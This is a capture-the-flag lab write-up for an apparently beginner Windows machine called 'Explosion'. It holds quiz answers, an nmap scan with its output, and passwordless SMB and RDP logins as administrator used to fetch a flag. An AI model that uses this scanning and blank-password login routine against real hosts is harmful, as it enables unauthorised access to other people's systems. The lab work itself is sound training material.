## 1. Questions
- Task 1
	- What does the 3-letter acronym RDP stand for?
		- `Remote Desktop Protocol`
- Task 2
	- What is a 3-letter acronym that refers to interaction with the host through a command line interface?
		- `CLI`
- Task 3
	- What about graphical user interface interactions?
		- `GUI`
- Task 4
	- What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23?
		- `telnet`
- Task 5
	- What is the name of the service running on port 3389 TCP?
		- `ms-wbt-server`
- Task 6
	- What is the switch used to specify the target host's IP address when using xfreerdp?
		- `/v:`
- Task 7
	- What username successfully returns a desktop projection to us with a blank password?
		- `administrator`
- Submit Flag
	- Submit root flag
## 2. Tools Used
- Linux
- CLI
- nmap
- smbclient
- dir
- more
- xfreerdp
## 3. Approach
### nmap scan
 - Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.99.63
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-13T08:20:06+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2025-09-12T08:16:28
|_Not valid after:  2026-03-14T08:16:28
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-13T08:19:58+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-13T08:20:02
|_  start_date: N/A
<snip>
```
### Research common SMB usernames
- Resources
	- https://medium.com/@taliyabilal765/smb-enumeration-guide-b2cb5cfb20e6#:~:text=2%2D-,Common%20credentials,-%3A%20Try%20common
	- https://hackviser.com/tactics/pentesting/services/smb
- Example usernames
	- anonymous
	- admin
	- administrator
	- root
### Test SMB connection (passwordless)
- Useful resource
	- https://github.com/irgoncalves/smbclient_cheatsheet
- Successfully connected using username `anonymous`
```bash
smbclient -L //10.129.99.63 -U anonymous
```
- Result
```bash
<snip>
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
<snip>
```
### Test share connection (passwordless)
- Useful resource
	- https://github.com/irgoncalves/smbclient_cheatsheet
- Successfully connected using username `administrator`
```
smbclient //10.129.99.63/C$ -U administrator
```
### Explore files and directories
- Useful resource
	- https://github.com/security-cheatsheet/cmd-command-cheat-sheet
- Flag found in `\Users\Administrator\Desktop` directory
### Retrieve the flag
- Useful resource
	- https://github.com/security-cheatsheet/cmd-command-cheat-sheet
```cmd
more \Users\Administator\Desktop\flag.txt
```
## 4. Alternative Approach
### nmap scan
 - Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.99.63
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-13T08:20:06+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2025-09-12T08:16:28
|_Not valid after:  2026-03-14T08:16:28
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-13T08:19:58+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-13T08:20:02
|_  start_date: N/A
<snip>
```
### Research common admin credentials
- Usernames
	- https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials#:~:text=Try%20the%20following%20usernames
- Password
	- https://outpost24.com/blog/it-admins-weak-password-use/#:~:text=password%2Dguessing%20attack.-,Top%2020%20administrator%20passwords,-%3A%20Default%2C%20static%2C%20and
### Test rdp connection (passwordless)
- Test usernames
	- administrator
	- user
	- admin
	- root
	- anonymous
- Successfully connected using username `administrator`
```bash
xfreerdp /v:10.129.99.63 /u:administrator /p: /dynamic-resolution
```
### Retrieve the flag
- Upon login, opened `flag.txt` on the Desktop.
![](../Assets/Screenshot%202025-09-13%20at%2009.41.22.png)
